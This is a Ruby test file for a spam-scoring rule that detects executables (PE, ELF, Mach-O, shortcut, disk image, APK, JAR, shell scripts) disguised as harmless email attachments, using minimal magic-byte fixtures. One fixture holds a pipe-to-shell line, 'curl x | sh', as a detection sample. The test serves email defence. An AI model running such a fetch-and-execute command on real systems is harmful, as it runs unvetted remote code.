require "test_helper"

class MailScore::Rules::MimeDisguisedProgramTest < MailScore::TestCase
  PE = ("MZ\x90\0".b + "\0" * 56 + [ 0x80 ].pack("V")).ljust(0x80, "\0") + "PE\0\0".b

  def test_a_windows_program_under_a_harmless_name
    hit = run_rule(attachment("invoice.pdf", PE))

    assert_equal [ "ATTACHMENT_DISGUISED_PROGRAM", 12.0, "invoice.pdf is exe" ], [ hit.name, hit.weight, hit.detail ]
    far = ("MZ".b + "\0" * 58 + [ 0x2000 ].pack("V")).ljust(0x2000, "\0") + "PE\0\0".b
    assert_equal "invoice.pdf is exe", run_rule(attachment("invoice.pdf", far)).detail
  end

  def test_other_programs_by_their_first_bytes
    {
      "\x7FELF\x02\x01\x01" => "elf",
      "\xFE\xED\xFA\xCE\0\0\0\x07" => "macho",
      "\xCF\xFA\xED\xFE\x07\0\0\x01" => "macho",
      "\xCA\xFE\xBA\xBE\0\0\0\x02" => "macho",
      "L\0\0\0\x01\x14\x02\0\0\0\0\0\xC0\0\0\0\0\0\0F" => "lnk",
      "conectix\0\0\0\x02" => "vhd",
      "vhdxfile\0\0\0\0" => "vhd",
      "#!/bin/sh\ncurl x | sh\n" => "script"
    }.each do |bytes, kind|
      assert_equal "photo.jpg is #{kind}", run_rule(attachment("photo.jpg", bytes.b)).detail, kind
    end
  end

  def test_a_zipped_app_or_java_program
    assert_equal "photos.zip is apk", run_rule(attachment("photos.zip", zip("AndroidManifest.xml", "classes.dex"))).detail
    assert_equal "report.docx is jar", run_rule(attachment("report.docx", zip("META-INF/MANIFEST.MF", "a/Main.class"))).detail
    assert_nil run_rule(attachment("photos.zip", zip("META-INF/MANIFEST.MF", "readme.txt")))
    assert_nil run_rule(attachment("report.docx", zip("word/document.xml")))
  end

  def test_what_is_not_a_program
    assert_nil run_rule(attachment("a.pdf", "MZ\x90\0".b + "\0" * 60))
    assert_nil run_rule(attachment("a.pdf", PE.sub("PE", "NE")))
    assert_nil run_rule(attachment("a.txt", "MZ is a postcode prefix"))
    assert_nil run_rule(attachment("a.pdf", "%PDF-1.7\n"))
    assert_nil run_rule(attachment("a.txt", "#!"))
  end

  def test_a_name_that_says_it_runs_code_or_says_nothing
    assert_nil run_rule(attachment("setup.exe", PE))
    assert_nil run_rule(attachment("update", "\x7FELF\x02\x01\x01".b))
    assert_nil run_rule("Content-Type: multipart/mixed; boundary=b\n\n--b\nContent-Type: application/octet-stream\nContent-Disposition: attachment\nContent-Transfer-Encoding: base64\n\n#{[ PE ].pack("m")}\n--b--\n")
  end

  def test_a_risky_extensions_file_replaces_the_list
    path = File.join(Dir.mktmpdir, "risky_extensions.txt").tap { File.write(it, "pdf\n") }

    assert_nil run_rule(attachment("invoice.pdf", PE), "risky_extensions" => path)
    assert run_rule(attachment("setup.exe", PE), "risky_extensions" => path)
  end

  private
    def attachment(name, bytes)
      "Content-Type: multipart/mixed; boundary=b\n\n--b\nContent-Type: text/plain\n\nsee attached\n--b\nContent-Type: application/octet-stream; name=#{name}\nContent-Transfer-Encoding: base64\n\n#{[ bytes ].pack("m")}\n--b--\n"
    end

    def zip(*entries)
      entries.map { "PK\x03\x04".b + "\0" * 22 + [ it.bytesize ].pack("v") + "\0\0" + it }.join
    end

    def run_rule(raw, settings = {})
      message = MailScore::Message.new(raw)
      MailScore::Rules::MimeDisguisedProgram.new(MailScore::Config.parse(SETTINGS.merge(settings), env: TOKENS), nil).run(message, MailScore::Envelope.read({}, message))
    end
end
